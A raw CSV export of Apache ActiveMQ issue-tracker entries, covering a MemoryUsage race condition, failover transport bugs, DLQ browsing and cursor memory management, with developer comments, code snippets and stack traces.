	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:722)

Found 1 deadlock.

Heap
 PSYoungGen      total 56064K, used 53316K [0x00000007c1600000, 0x00000007c8380000, 0x0000000800000000)
  eden space 48064K, 96% used [0x00000007c1600000,0x00000007c43411b0,0x00000007c44f0000)
  from space 8000K, 87% used [0x00000007c44f0000,0x00000007c4bc0000,0x00000007c4cc0000)
  to   space 8000K, 0% used [0x00000007c7bb0000,0x00000007c7bb0000,0x00000007c8380000)
 ParOldGen       total 128256K, used 2922K [0x0000000744200000, 0x000000074bf40000, 0x00000007c1600000)
  object space 128256K, 2% used [0x0000000744200000,0x00000007444daab8,0x000000074bf40000)
 PSPermGen       total 21248K, used 13151K [0x000000073f000000, 0x00000007404c0000, 0x0000000744200000)
  object space 21248K, 61% used [0x000000073f000000,0x000000073fcd7eb8,0x00000007404c0000)

{code}",,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,326676,,,Tue May 07 16:16:27 UTC 2013,,,,,,,,,,,"0|i1kcvz:",327021,,,,,,,,,,,,,,,,,,,,,"07/May/13 16:16;tabish;fix applied on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MemoryUsage waitForSpace in inconsistent state,AMQ-4512,12646315,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,shendley,shendley,06/May/13 22:14,14/Oct/15 16:14,14/Jul/23 05:43,10/May/13 17:14,5.6.0,5.7.0,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"There is a race condition in MemoryUsage which makes it possible for it to be left in an inconsistent state and thereby hang any clients in waitForSpace().

The core issue is in the following block of code:
{code:java}
    public void decreaseUsage(long value) {
        if (value == 0) {
            return;
        }
        int percentUsage;
        synchronized (usageMutex) {
            usage -= value;
            percentUsage = caclPercentUsage();
        }
        setPercentUsage(percentUsage);
        if (parent != null) {
            parent.decreaseUsage(value);
        }
    }
{code}

The bug occurs when multiple threads are calling increment/decrement at same time. Since the field ""usage"" is protected with the usageMutex each writer/reader will see the correct and current value for usage and calculate the right value for percentUsage at that instant. ""setPercentUsage"" is also   protected by the same usageMutex so we resyncronize on usageMutex to set the percentUsage field as well. The issue is that threads may enter the setPercentUsage synchronized block in a different order than they entered the percentUsage ""calculating"" block. Since percentUsage is carried between the two blocks, a reordering of threads can allow the wrong final percentUsage value to be set. 

Possible threading (imagine usage starts at 0 and limit is 100).
Thread #1 - usage += 150; percentUsage = 150;
Thread #1 - suspended before called setPercentUsage
Thread #2 - usage -= 150; percentUsage = 0;
Thread #2 - setPercentUsage(0);
Thread #1 - resumed, can now call setPercentUsage
Thread #1 - setPercentUsage(150);

Final value = 150

This same pattern of synchronizing to calculate the percentUsage and then setting the value later is repeated in all of the Usage objects I looked at. My guess it was written this way to avoid holding locks while making calls out to ""untrusted code"" but it is a very dangerous way to do the calculations. The most surprising thing is the locks are still being explicitly held while calling fireEvent anyways.

I have attached two screenshots taken using a debugger of two threads that have both been stalled for multiple minutes on ""waitForSpace"" trying to publish to the same queue. Notice they both have a ""usage"" of 0 but a ""percentUsage"" > 100, this should be impossible. To get the system into this state I was using JmsTemplate and a CachingConnectionFactory to publish on 8 threads and a single DefaultMessageListenerContainer who is pulling the messages off as fast as possible. The test publishes 100000 measurements and around ~75% of the time atleast a few producers end up stalled in waitForSpace() even though the queue is ready for more messages. I can also reproduce these results using JmsTemplate and PooledConnectionFactory so I don't believe it's an issue in the pooling implementations.",,dhananjaydp,gtully,shendley,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/May/13 20:03;tabish;AMQ4512Patch.txt;https://issues.apache.org/jira/secure/attachment/12582353/AMQ4512Patch.txt","08/May/13 19:33;tabish;AMQ4512Patch.txt;https://issues.apache.org/jira/secure/attachment/12582348/AMQ4512Patch.txt","06/May/13 22:14;shendley;MemUsage1.PNG;https://issues.apache.org/jira/secure/attachment/12581976/MemUsage1.PNG","06/May/13 22:14;shendley;MemUsage2.PNG;https://issues.apache.org/jira/secure/attachment/12581977/MemUsage2.PNG","07/May/13 14:55;shendley;MemoryUsageTest.java;https://issues.apache.org/jira/secure/attachment/12582105/MemoryUsageTest.java","06/May/13 22:30;shendley;QueueStats.PNG;https://issues.apache.org/jira/secure/attachment/12581980/QueueStats.PNG",,,,,,,,,,,,,,,,6.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,326673,,,Wed Oct 14 16:14:42 UTC 2015,,,,,,,,,,,"0|i1kcvj:",327018,,,,,,,,,,,,,,,,,,,,,"07/May/13 13:35;gtully;analysis looks good. lining up for 5.9 - any chance you could produce a simple junit test case that just exercises MemoryUsage and multiple threads. would be good to have a simple way to validate and protect any fix.;;;","07/May/13 14:55;shendley;Wow, I'm not surprised this doesn't occur alot for other people, it takes 10s of thousands of iterations for me to detect a failure. I am amazed it occurs so often in my main test case using the full broker, I'm sure if I was on another machine with more/less cores I wouldn't have ever noticed this. 

The test case I'm uploading fails most runs. I found attaching a debugger and/or profiler made it much more likely to hit. Switching the number of cores it can run on should also help. Heres a sample output on a failure.

{code:java}
Attempt: 673 : Usage(null) percentUsage=35%, usage=0, limit=1000, percentUsageMinDelta=1%
Operations: [15, 12, 33, 76, 23, 64, 43, 58, 64, 21, 57, 57, 15, 80, 50, 17, 63, 90, 58, 46, 98, 21, 22, 78, 43, 9, 58, 16, 83, 45, 60, 59, 99, 42, 62, 91, 62, 29, 69, 97, 12, 80, 33, 36, 15, 97, 48, 28, 9, 63, 93, 13, 75, 83, 7, 21, 29, 20, 87, 88, 23, 81, 39, 91, 68, 46, 75, 35, 46, 53, 42, 89, 59, 7, 98, 2, 36, 28, 9, 3, 51, 13, 90, 71, 82, 40]

java.lang.AssertionError: 
Expected :0
Actual   :35
 <Click to see difference>
	at org.junit.Assert.fail(Assert.java:93)
	at org.junit.Assert.failNotEquals(Assert.java:647)
	at org.junit.Assert.assertEquals(Assert.java:128)
	at org.junit.Assert.assertEquals(Assert.java:472)
	at org.junit.Assert.assertEquals(Assert.java:456)
	at com.sms.backspool.jms.MemoryUsageTest.checkPercentage(MemoryUsageTest.java:149)
	at com.sms.backspool.jms.MemoryUsageTest.testCycle(MemoryUsageTest.java:22)
{code};;;","07/May/13 14:55;shendley;Test case showing failure. Remember that there are many other functions that have the same broken pattern of letting the ""percentUsage"" escape the synchronized block and they should be fixed across the board, not just for MemoryUsage.;;;","08/May/13 19:33;tabish;I took a stab at cleaning this up, you're welcome to review and comment.  ;;;","08/May/13 20:42;shendley;Changes look pretty solid, did the test case break for you reliably?

I am still worried about holding the lock during listener callbacks, seems like an easy way to cause deadlocks. Meh, its gotten this far without deadlocking and this is no worse so its probably ok.;;;","08/May/13 20:52;tabish;Yes, the test shows the issue reliably.

At least in the case of fireEvent we queue up the callbacks in an executor so really the locks can be safely held.  The one that's a bit more scary is the notifyCallbackWhenNotFull but if you look at the Broker code the callbacks are merely waking up a task runner so its ok for these as well. ;;;","10/May/13 17:14;tabish;Fixes and the test case added on trunk;;;","06/Dec/14 18:50;shendley;We are still pinned to 5.8.0 because of some other dependencies (camel mostly) so despite me knowing about this issue for nearly 2 years I still can't ship with producerWindow enabled. This has become a real problem because the ""raw socket blocking"" is preventing any sort of clean shutdown. 

Do you think I would be about backporting these fixes and the related one for AMQ-4361 to 5.8.0? I copied over the Usage class and it's sub classes from 5.9.0. No other code changes were made and all of the unit tests in activemq passed. Any ideas how I would go about verifying the safety of these changes?
;;;","14/Oct/15 16:14;dhananjaydp;Is there any valid work around for applications which are stick to 5.7.0?

I am using 5.7.0 client libraries, as I am tied to other dependencies like karaf, camel etc. 

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FailoverTransport throws NullPointerException,AMQ-4507,12645801,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,tom_guenter,tom_guenter,02/May/13 12:43,01/Jun/14 19:46,14/Jul/23 05:43,02/May/13 13:04,5.8.0,,,,,5.9.0,,,Transport,,,,0,patch,,,,,,,,"The Failovertransport throws NullPointer Exceptions in case of a failover to another primary host for the following broker url:

{{failover:(tcp://primary_1:61616,tcp://primary_2:61616,tcp://secondary_1:61616,tcp://secondary_2:61616)?randomize=false&priorityBackup=true&priorityURIs=tcp://primary_1:61616,tcp://primary_2:61616&jms.alwaysSyncSend=true}}

Stack trace:
Exception in thread ""ActiveMQ Task-2"" java.lang.NullPointerException
	at org.apache.activemq.transport.failover.FailoverTransport.disposeTransport(FailoverTransport.java:231)
	at org.apache.activemq.transport.failover.FailoverTransport.doReconnect(FailoverTransport.java:954)
	at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:143)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
	at java.lang.Thread.run(Thread.java:722)


I assume that this is a copy-paste bug, since in the current revision (1478184, see link below) of the FailoverTransport on line #966, the variable 'old' should be checked for null instead of 'transport'. However, I have no clue why 'old' is null even though the transport was handling messages before the failover.

[http://svn.apache.org/viewvc/activemq/trunk/activemq-client/src/main/java/org/apache/activemq/transport/failover/FailoverTransport.java?revision=1478184&view=markup]

Current code:
955 Transport old = this.connectedTransport.getAndSet(null);
966 if (transport != null) \{
967   disposeTransport(old);
968 \}

Corrected code:
955 Transport old = this.connectedTransport.getAndSet(null);
966 if (old!= null) \{
967   disposeTransport(old);
968 \}
","Win 7, java 7",gtully,tom_guenter,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,326160,,,Sun Jun 01 19:46:01 UTC 2014,,,,,,,,,,,"0|i1k9pj:",326505,,,,,,,,,,,,,,,,,,,,,"02/May/13 13:04;gtully;fix applied with thanks in http://svn.apache.org/r1478357;;;","01/Jun/14 19:46;tom_guenter;Verified a long time ago, but missed to close it.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Client doesn't fail over to other broker if updateClusterClientsOnRemove = true,AMQ-4505,12645726,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,carlospollo11,carlospollo11,01/May/13 23:56,11/Mar/19 13:34,14/Jul/23 05:43,03/May/13 15:21,5.8.0,,,,,5.9.0,,,JMS client,,,,0,,,,,,,,,"When a cluster of brokers have updateClusterClients=""true"" rebalanceClusterClients=""true"" updateClusterClientsOnRemove=""true"" in the transport connector and a client connects including only one broker address. If the broker the client is connected to stops, it doesn't failover to the other ones. 

This happens when updateClusterClientsOnRemove=true, if it's false client fails over to the other brokers.","Mac OSX 10.6.8
java version ""1.6.0_43""",carlospollo11,gtully,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-7165,,,,,,,,,,,,,,,,"02/May/13 00:00;carlospollo11;AMQ-4505-TestcaseToReproduce.patch;https://issues.apache.org/jira/secure/attachment/12581443/AMQ-4505-TestcaseToReproduce.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,326085,,,Thu May 01 13:28:41 UTC 2014,,,,,,,,,,,"0|i1k98v:",326430,,,,,,,,,,,,,,,,,,,,,"02/May/13 00:00;carlospollo11;This is a simple test case that reproduces the issue.;;;","02/May/13 18:34;carlospollo11;Could this be fixed also in 5.8 (5.8.1)? We have already deployed 5.8 brokers in production and we would like to use the auto rebalance features.
;;;","02/May/13 18:45;tabish;The next planned release is 5.9.0, no other 5.8.0 are planned. ;;;","02/May/13 18:49;carlospollo11;When do you think 5.9 will be released? 5.8 brokers will be compatible with 5.9 clients? Thanks in advance.;;;","02/May/13 18:52;tabish;1. When its ready.
2. They should work together but we generally recommend you upgrade to matching versions ASAP. ;;;","03/May/13 15:21;tabish;Fixed on trunk. ;;;","10/May/13 01:14;carlospollo11;Hi Timothy, It looks that I've found another issue when you have an HA pair with shared storage, this time is failing to failover even if updateClusterClientsOnRemove=false. Could you please point me to your HA test cases so I can try to reproduce it there (I couldn't find them)?

Probably the changes to this bug fixes the issue I just found, but I want to have a test case so we make sure is fixed in 5.9.

Thanks in Advance.;;;","01/May/14 13:28;gtully;related test case at: https://github.com/apache/activemq/blob/20f384ce59b758a0f3c1b0e0620e2efd58ca230a/activemq-unit-tests/src/test/java/org/apache/activemq/transport/failover/FailoverComplexClusterTest.java;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stalled pending message dispatch to composite destination consumer,AMQ-4504,12645696,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,01/May/13 20:43,01/May/13 20:50,14/Jul/23 05:43,01/May/13 20:50,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"With a backlog of messages on N destinations that exceeds the prefetch of the composite consumer for N, it is possible for dispatch on one destination to find the subscription full with messages from the other destinations.
If there are no pending messages for that destination it won't get an ack and hence won't attempt to dispatch again till there is another send. Leading to stalled pending messages.
The solution is to have a subscription wakeup all destination it is subscribed to once its dispatch list is exhausted.",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,326057,,,Wed May 01 20:50:31 UTC 2013,,,,,,,,,,,"0|i1k92n:",326402,,,,,,,,,,,,,,,,,,,,,"01/May/13 20:50;gtully;fix and test in http://svn.apache.org/r1478183;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
browseAsTable() returns data but browse() does not when browsing a DLQ with some expired messages on it?,AMQ-4503,12645650,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jstrachan,jstrachan,01/May/13 16:45,02/May/13 09:20,14/Jul/23 05:43,02/May/13 09:20,,,,,,5.9.0,,,,,,,0,,,,,,,,,"am trying to test out DLQ stuff in hawtio. I tried sending some messages with JMSExpiration / timeToLive header of 10000 to a queue with no consumers. Then waited a bit; then started the consumers. 

The messages expire properly and are put on the ActiveMQ.DLQ (I see the queue size etc).

Executing on ActiveMQ.DLQ DLQ, the browse() method returns nothing. However browseAsTable() returns the data. I thought the only real difference between these 2 methods was the CompositeData versus TabularData? Any idea why we can't browse DLQs in hawtio?","hawtio 1.2-SNAPSHOT, ActiveMQ 5.8.0",ceposta,jstrachan,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,326011,,,Thu May 02 09:19:59 UTC 2013,,,,,,,,,,,"0|i1k8sf:",326356,,,,,,,,,,,,,,,,,,,,,"02/May/13 04:35;ceposta;James,
I committed a test that shows browsing the DLQ to work in the trunk (r1478266). I also tried from jconsole and it worked. Maybe try a snapshot?;;;","02/May/13 09:19;jstrachan;I managed to confuse myself, I tried sending from hawtio to the ActiveMQ specifying timeToLive / JMSExpiration headers - which doesn't work. I raised AMQ-4506 to track this. 

Turns out you have to use the Camel endpoint for the queue today to send a message with a timeToLive / JMSExpiration header. Once you do that - in 5.9 snapshot - it does work and I can browse the DLQ. Many thanks! Its definitely a 5.8 bug;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover priorityBackup doesn't work if client accepts updates to its list of known URIs from the broker.,AMQ-4501,12645557,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,carlospollo11,carlospollo11,30/Apr/13 23:52,01/May/13 20:55,14/Jul/23 05:43,01/May/13 20:55,5.8.0,,,,,5.9.0,,,JMS client,,,,0,,,,,,,,,"If a client has priorityBackup enabled and connects to a broker in a cluster with updateClusterClients=""true"" in its transport connector, the client ignores the priorityBackup flag it connects to any URI received from the broker, even if that URI doesn't have priority.

This is easy to reproduce adding a test case to the activemq-unit-tests/src/test/java/org/apache/activemq/transport/failover/FailoverPriorityTest.java test suite.","Mac OSX 10.6.8
java version ""1.6.0_43""",carlospollo11,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/May/13 00:10;carlospollo11;AMQ-4501-TestcaseToReproduce.patch;https://issues.apache.org/jira/secure/attachment/12581285/AMQ-4501-TestcaseToReproduce.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,325918,,,Wed May 01 20:55:20 UTC 2013,,,,,,,,,,,"0|i1k87r:",326263,,,,,,,,,,,,,,,,,,,,,"01/May/13 00:04;carlospollo11;This test case is very similar to testPriorityBackup. The only difference is that when the transport connectors are created, the cluster flag is set to true which basically creates the connector with updateClusterClients=""true"" rebalanceClusterClients=""true"" updateClusterClientsOnRemove=""true"".;;;","01/May/13 15:27;tabish;I see one issue so far in Failover transport at least in relation to his test case.  The client uses a string compare of the connected transport URI against the first in the connect list, which can be different if for instance the client is configured with ""tcp://localhost:61616"" and the broker sends the resolved ""tcp://127.0.0.1:61616"".  In that case the client incorrectly reconnects thinking it needs to make a change when in fact its already on the right one.;;;","01/May/13 20:55;tabish;Fixed on trunk.  In practice its fine to have the clients updated with new brokers but you really don't want to combine priority backup and cluster rebalance as the clients that are on the priority backup will ignore any rebalance requests. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Changes to AMQ2832Test cause SparseAckReplayAfterStoreCleanupLevelDBStoreTest to fail,AMQ-4500,12645516,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,30/Apr/13 20:49,30/Apr/13 21:12,14/Jul/23 05:43,30/Apr/13 21:12,,,,,,,,,Test Cases,,,,0,,,,,,,,,"SparseAckReplayAfterStoreCleanupLevelDBStoreTest extends AMQ2832Test but uses LevelDB.  The test case testAlternateLossScenario is dependent on KahaDB, so it fails under SparseAckReplayAfterStoreCleanupLevelDBStoreTest.

I'll add a patch which skips this test when using LevelDB.
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Apr/13 20:51;kearls;AMQ-4500.patch;https://issues.apache.org/jira/secure/attachment/12581228/AMQ-4500.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,325878,,,Tue Apr 30 21:12:54 UTC 2013,,,,,,,Patch Available,,,,"0|i1k7z3:",326223,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"30/Apr/13 21:12;tabish;patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"""Error formatting macro"" on ""how to use SSL page""",AMQ-4496,12645380,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,kotkot,kotkot,30/Apr/13 07:21,10/Jul/13 20:57,14/Jul/23 05:43,10/Jul/13 20:57,,,,,,,,,Documentation,,,,0,,,,,,,,,"Error formatting macro: snippet: java.lang.IndexOutOfBoundsException: Index: 20, Size: 20

http://activemq.apache.org/how-do-i-use-ssl.html",,kotkot,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,325742,,,Wed Jul 10 20:57:32 UTC 2013,,,,,,,,,,,"0|i1k74v:",326087,,,,,,,,,,,,,,,,,,,,,"30/Apr/13 07:23;kotkot;Also link to SslTransportFactory.java right after the code snippet is broken;;;","10/Jul/13 20:57;tabish;Page is showing up correctly now. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve cursor memory management,AMQ-4495,12645235,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,dejanb,dejanb,29/Apr/13 13:44,13/Sep/19 15:12,14/Jul/23 05:43,08/Mar/16 13:49,,,,,,5.9.0,,,,,,,0,,,,,,,,,"As currently stands, the store queue cursor will cache producer messages until it gets to the 70% (high watermark) of its usage. After that caching stops and messages goes only in store. When consumers comes, messages get dispatched to it, but memory isn't released until they are acked. The problem is with the use case where producer flow control is off and we have a prefetch large enough to get all our messages from the cache. Then, basically the cursor gets empty and as message acks release memory one by one, we go to the store and try to batch one message at the time. You can guess that things start to be really slow at that point. 

The solution for this scenario is to wait with batching until we have more space so that store access is optimized. We can do this by adding a new limit (smaller then the high watermark) which will be used as the limit after which we start filling cursor from the store again.

All this led us to the following questions:

1. Why do we use 70% as the limit (instead of 100%) when we stop caching producer messages?

2. Would a solution that stop caching producer messages at 100% of usage and then start batching messages from the store when usage drops below high watermark value be enough. Of course, high watermark would be configurable, but 100% by default so we don't alter any behavior for regular use cases.",,cshannon,dejanb,gtully,jira-bot,tmielke,wangyin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/May/13 09:25;wangyin;FasterDispatchTest.java;https://issues.apache.org/jira/secure/attachment/12582066/FasterDispatchTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,325597,,,Tue Mar 08 17:30:27 UTC 2016,,,,,,,,,,,"0|i1k68n:",325942,Regression,,,,,,,,,,,,,,,,,,,,"02/May/13 06:54;wangyin;Before we can enjoy the improvement,is the optimization acknowledge option for consumers able to rescue the poor performance b/w of loading messages one by one from the store?;;;","02/May/13 08:26;dejanb;Unfortunately not, as memory is released one message at the time even in that case (which triggers new store batch and basically just load one message);;;","02/May/13 12:34;gtully;allowing a batch load from the store to exceed the memory limit may be the simplest approach. The batch size is already configurable so the excess is controllable. In essence, once we go to the store we always load a full batch if we can so we don't check the usage on each message recovery.;;;","03/May/13 14:55;dejanb;Fixed with svn revision 1478823

The solution Gary mentioned has been implemented, basically allowing us to exceed a memory limit a bit for the more optimal store reads.;;;","07/May/13 09:25;wangyin;there is only 2% performance improvement in my observation.;;;","07/May/13 09:25;wangyin;I have tried to add a testcase to verify the improvement, but I can only see a little effect.
It would be better you can take a look at the testcase and give it a try to see the effect.;;;","08/May/13 10:27;wangyin;More concurrence tests indicate load on the database server decreases noticeably than the original design when the memory usage of queues is exhausted.
Seems we can not see the dispatch speed increases while the load of the store server is lower than before.;;;","29/Feb/16 16:34;gtully;There is a problem with this change. Going past the highWaterMark can have a negative influence on other consumers and destinations leading to the inability to page messages for dispatch.
This is a general problem for a shared limit but it is made worse with this fix.
Consider destinations that has stopped caching at 70% usage, so that
flow control does not kick in and producers can send directly to disk.
If the cache is less than the pageSize this is particularly problematic.
As messages page in, the usage goes past 100% and now producers will be flow controlled, rather than still going directly to disk. That is not what we want.

I am thinking that paging in for dispatch should respect the highWaterMark, so it is not safe to just ""always page in a full page"";;;","01/Mar/16 11:55;jira-bot;Commit d8cf54b0a9eee4b86db1ffef2cb3dd1171067307 in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=d8cf54b ]

https://issues.apache.org/jira/browse/AMQ-4495 - revisit. Reinstate check for space on pagein, so that highWaterMark is respected and full state is not reached, hense pfc is not triggered in error
;;;","01/Mar/16 13:25;cshannon;[~gtully],

Two questions/comments,

First, with this new commit, I assume that means there will be reduced performance again? Some of the brokers I've run are on machines with relatively slow disk performance so that is a potential concern.

Second, do you think your new change might reduce potential OOM errors?  I've seen out of memory problems occasionally even though proper usage limits are set and I've always thought that maybe that had something to do with the fact that paging in on dispatch could load more than 100% of the usage into memory.;;;","01/Mar/16 13:42;gtully;[~cshannon] yes to both.

It was oom that brought me back, then i saw the producer flow control (pfc) use case and was convinced.

The original perf issue is a case where a consumer takes a page and as the acks come back, the page is empty so we go to the store, take in one message (as we again hit our limit (b/c the prefetched messages are not acked yet) and dispatch it. Then repeat.

I think the pref issue can be addressed with some taking account of the prefetch, but it may be tricky.

I am now thinking that we need a high and low water mark. using the low for caching on the producer side, and using the high for page in. That is sort of what we have with the high and full mark at the moment. so maybe there is no need to change much.
however the full trigger is what causes pfc to kick in so it is not isolated.
Thinking now, the pfc check could be conditional on the cursor caching messages. That may separate the concerns some which would help simplify.
Need to investigate that a bit. Thanks for your eyes on this, it is a tricky area, dispatch on memory limits. Not sure there is a perfect answer but I think it can be improved.;;;","01/Mar/16 13:54;gtully;The second use case here is starvation, simplest when there is a shared memory limit, so just a broker usage limit.
Send to q1, it stops caching at < 70%. Send to q2, it stops caching immediately, same for q3.
